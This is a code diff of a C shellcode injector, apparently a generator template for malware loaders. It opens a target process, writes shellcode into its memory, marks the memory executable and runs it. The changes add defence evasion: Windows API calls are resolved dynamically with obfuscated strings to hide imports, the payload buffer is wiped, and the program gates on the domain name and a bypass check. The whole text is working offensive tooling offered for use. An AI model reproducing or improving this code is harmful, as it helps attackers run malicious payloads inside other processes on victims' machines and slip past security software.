@@ -30,6 +30,7 @@ bool Bypass(){
 	return true;
 }
 
+
 // AESDecrypt_replace
 // ProcessCreate_replace
 // ProcessOpen_replace
@@ -44,7 +45,11 @@ int go(char * proc_to_inj, unsigned char * shellcode, SIZE_T size) {
 	#endif
 	char 	domain[MAX_PATH];
 	DWORD 	domain_size = sizeof(domain);
-	GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);
+
+	typedef BOOL (WINAPI * GetComputerNameExA_) (COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
+	GetComputerNameExA_ _GetComputerNameExA = (GetComputerNameExA_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"GetComputerNameExA"<ob_end>);
+	_GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);
+	//GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);
 
 	#ifdef DEBUG
 		printf("[*] Domain name: %s\n", domain);
@@ -57,39 +62,53 @@ int go(char * proc_to_inj, unsigned char * shellcode, SIZE_T size) {
 	if (process == NULL) {
 		return 1;
 	}
+
+	typedef BOOL (WINAPI * CloseHandle_) (HANDLE);
+	CloseHandle_ _CloseHandle = (CloseHandle_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CloseHandle"<ob_end>);
+	typedef BOOL (WINAPI * VirtualFreeEx_) (HANDLE, LPVOID, SIZE_T, DWORD);
+	VirtualFreeEx_ _VirtualFreeEx = (VirtualFreeEx_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"VirtualFreeEx"<ob_end>);
+
+
 	LPVOID mem = AllocMemory(process, size);
 	if (mem == NULL) {
-		CloseHandle(process);
+		_CloseHandle(process);
 		return 1;
 	}
 	if (!WriteMemory(process, mem, shellcode, size)) {
-		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
-		CloseHandle(process);
+		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
+		_CloseHandle(process);
 		return 1;
 	}
+
+    RtlSecureZeroMemory(shellcode, size);
+
 	if (!ProtectMemory(process, mem, size, PAGE_EXECUTE_READ)) {
-		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
-		CloseHandle(process);
+		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
+		_CloseHandle(process);
 		return 1;
 	}
 	if (!ExecuteMemory(process, mem)) {
-		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
-		CloseHandle(process);
+		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
+		_CloseHandle(process);
 		return 1;
 	}
-	VirtualFreeEx(process, mem, 0, MEM_RELEASE);
-	CloseHandle(process);
+	_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
+	_CloseHandle(process);
 	return 0;
 }
 
 int main() {
+	typedef VOID (WINAPI * ExitProcess_) (UINT);
+	ExitProcess_ _ExitProcess = (ExitProcess_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"ExitProcess"<ob_end>);
 
 	if(!Bypass()) {
-		ExitProcess(0);
+		// ExitProcess(0);
+		_ExitProcess(0);
 	}
 
 	if(!PayloadControl()) {
-		ExitProcess(0);
+		// ExitProcess(0);
+		_ExitProcess(0);
 	}
 
 
